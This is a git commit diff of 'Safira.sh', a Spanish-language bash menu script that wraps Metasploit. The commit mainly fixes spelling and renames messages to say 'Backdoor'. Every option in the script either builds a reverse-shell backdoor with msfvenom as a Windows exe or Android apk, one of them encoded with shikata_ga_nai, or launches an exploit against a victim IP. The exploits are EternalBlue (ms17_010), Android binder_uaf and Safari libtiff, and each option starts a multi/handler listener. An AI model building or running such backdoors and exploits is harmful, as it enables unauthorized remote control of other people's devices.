3d27c469f4d6b2ff41d532133f8d8e2e9a7bb84a
cripton666 <70113407+cripton666@users.noreply.github.com>
2020-08-30 22:56:52 -0400

    Update Safira.sh

--- Safira.sh
+++ Safira.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+#programador cripton666
 echo    "
                                       \\\\\\\\\\ SAFIRA //////"
         
@@ -11,18 +12,18 @@ opciones="windows/meterpreter/reverse_tcp android/meterpreter/reverse_tcp window
 select opcion in $opciones 
 do
         if [ $opcion = "windows/meterpreter/reverse_tcp" ]; then
-                echo "Para crear la apk nesecito algunos datos"
+                echo "Para crear el Backdoor necesito algunos datos"
                 read -p "PUERTO :" o 
                 read -p "IP o HOST:" a 
                 read -p "Nombre de la Aplicacion :" q
-                echo "Creando Aplicacion"
+                echo "Creando Backdoor"
                 msfvenom -p windows/meterpreter/reverse_tcp lhost=$a lport=$o -f exe -o $q.exe 
                 echo "Creado con exito"
                 echo
                 echo "Conectando a base de datos Postgresql"
                 sudo service postgresql start
                 echo "Conectado con Exito" 
-                echo "Habriendo Metasploit"
+                echo "Abriendo Metasploit"
                 msfconsole -x "use multi/handler;\
                 set PAYLOAD windows/meterpreter/reverse_tcp;\
                 set lhost $a;\
@@ -30,17 +31,17 @@ do
                 exploit"
                 exit
         elif [ $opcion = "android/meterpreter/reverse_tcp" ]; then
-                echo "Para crear la apk nesecito algunos datos"
+                echo "Para crear el backdoor necesito algunos datos"
                 read -p "Puerto :" b 
-                read -p "IP :" c 
-                read -p "Nombre de la apk :" q
-                echo "Creando apk"
+                read -p "IP o HOST:" c 
+                read -p "Nombre del Backdoor :" q
+                echo "Creando Backdoor"
                         msfvenom -p android/meterpreter/reverse_tcp LHOST=$c LPORT=$b R > $q.apk
                 echo "Creado con exito"
                 echo "Conectando servicio postgresql"
                 sudo service postgresql start 
                 sudo "Conectado con Exito"
-                echo "Habriendo Metasploit"
+                echo "Abriendo Metasploit"
                 msfconsole -x "use multi/handler;\
                 set PAYLOAD android/meterpreter/reverse_tcp;\
                 set lhost $c;\
@@ -48,17 +49,17 @@ do
                 exploit"
                 exit
         elif [ $opcion = "windows/shell/reverse_tcp" ]; then
-                echo "Para crear la apk nesecito algunos datos"
+                echo "Para crear el Backdoor necesito algunos datos"
                 read -p "PUERTO :" o 
                 read -p "IP o HOST:" a 
-                read -p "Nombre de la Aplicacion :" q
+                read -p "Nombre de el Backdoor :" q
                 echo "Creando Aplicacion"
                 msfvenom -p windows/shell/reverse_tcp lhost=$a lport=$o -f exe -o $q.exe 
                 echo "Creado con exito"
                 echo "Conectando a servicio postgresql" 
                 sudo service postgresql start
                 echo "Conectado con Exito" 
-                echo "Habriendo Metasploit"
+                echo "Abriendo Metasploit"
                 msfconsole -q -x "use multi/handler;\
                 set PAYLOAD windows/shell/reverse_tcp;\
                 set lhost $a;\
@@ -66,10 +67,10 @@ do
                 exploit"
                 exit
         elif [ $opcion = "exploit/android/local/binder_uaf" ]; then
-                echo "alerta es un exploit no apk"
+                echo "alerta es un exploit no un Backdoor"
                 read -p "numero de la SESSION :" o 
                 read -p "IP o Host :" a 
-                echo "Habriendo servicio postgresql"
+                echo "Abriendo servicio postgresql"
                 sudo service postgresql start
                 echo "Conectado con exito"
                 echo "Ejecutando Metasploit"
@@ -79,7 +80,7 @@ do
                 exploit"      
                 exit
         elif [ $opcion = "windows/meterpreter/reverse_tcp(shikata_ga_nai)" ]; then
-                echo "Para crear la Aplicacion nesecito algunos datos"
+                echo "Para crear el Backdoor necesito algunos datos"
                 read -p "PUERTO :" o 
                 read -p "IP o HOST:" a 
                 read -p "Nombre de la Aplicacion :" q
@@ -89,7 +90,7 @@ do
                 echo "Conectando a servicio postgresql" 
                 sudo service postgresql start
                 echo "Conectado con Exito" 
-                echo "Habriendo Metasploit"
+                echo "Abriendo Metasploit"
                 msfconsole -x "use multi/handler;\
                 set PAYLOAD windows/meterpreter/reverse_tcp;\
                 set lhost $a;\
@@ -97,9 +98,9 @@ do
                 exploit"
                 exit
         elif [ $opcion = "exploit/apple_ios/browser/safari_libtiff" ]; then
-                echo "alerta es un exploit no apk"
-                read -p "IP o Host :" a 
-                echo "Habriendo servicio postgresql"
+                echo "alerta es un exploit no un Backdoor"
+                read -p "IP o HOST :" a 
+                echo "Abriendo servicio postgresql"
                 sudo service postgresql start
                 echo "Conectado con exito"
                 echo "Ejecutando Metasploit"
@@ -110,13 +111,13 @@ do
                 run"      
                 exit
         elif [ $opcion = "exploit/windows/smb/ms17_010_eternalblue" ]; then
-                echo "Para estableser coneccion nesecito un minimo de datos"
+                echo "Para Ejecutar necesito un minimo de datos"
                 read -p "IP VICTIMA RHOSTS :" o 
                 echo "Conectando con Exploit"
                 echo "Conectando a servicio postgresql" 
                 sudo service postgresql start
                 echo "Conectado con Exito" 
-                echo "Habriendo Metasploit"
+                echo "Abriendo Metasploit"
                 msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;\
                 set RHOSTS $o;\
                 set RPORT 445;\
